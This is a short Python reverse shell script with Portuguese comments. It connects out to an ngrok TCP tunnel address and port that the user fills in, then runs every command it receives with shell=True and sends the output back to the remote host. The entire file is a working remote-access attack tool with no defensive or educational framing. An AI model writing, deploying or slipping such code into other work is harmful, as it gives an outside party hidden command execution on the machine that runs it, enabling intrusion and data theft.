import socket
import subprocess

ip = "0.tcp.ngrok.io" #coloca o endereço do ngrok
port = 1234 #Coloca a porta que o ngrok gerou
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

if s:
    while True:
        dados = s.recv(1024)
        proc = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
        saida = proc.stdout.read() + proc.stderr.read()
        s.send("\n"+saida)
        s.send("Conectado a maquina: ")
